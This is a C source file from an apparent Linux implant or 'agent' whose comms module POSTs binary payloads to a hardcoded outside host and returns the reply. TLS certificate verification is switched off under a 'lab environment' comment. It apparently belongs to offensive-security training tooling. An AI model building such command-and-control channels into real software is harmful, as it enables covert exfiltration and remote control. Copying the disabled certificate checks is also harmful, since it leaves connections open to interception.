// linux-agent/src/comms_linux.c
#include "comms_linux.h"
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

typedef struct { char* buf; size_t len; } RespBuf;

static size_t write_cb(char* ptr, size_t size,
                       size_t nmemb, void* userdata) {
    size_t total = size * nmemb;
    RespBuf* resp = (RespBuf*)userdata;
    char* tmp = realloc(resp->buf, resp->len + total);
    if (!tmp) return 0;
    resp->buf = tmp;
    memcpy(resp->buf + resp->len, ptr, total);
    resp->len += total;
    return total;
}

int agent_post(const char* endpoint,
               const unsigned char* payload, size_t paylen,
               unsigned char** resp_out, size_t* resp_len) {
    CURL* curl = curl_easy_init();
    if (!curl) return -1;

    RespBuf resp = {NULL, 0};
    char url[256];
    snprintf(url, sizeof(url),
             "https://www.the0dayworkshop.com%s", endpoint);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers,
                                "Content-Type: application/octet-stream");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)paylen);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
    // Lab environment: skip cert verification
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode rc = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (rc != CURLE_OK || http_code != 200) {
        free(resp.buf);
        return -1;
    }

    *resp_out = (unsigned char*)resp.buf;
    *resp_len = resp.len;
    return 0;
}
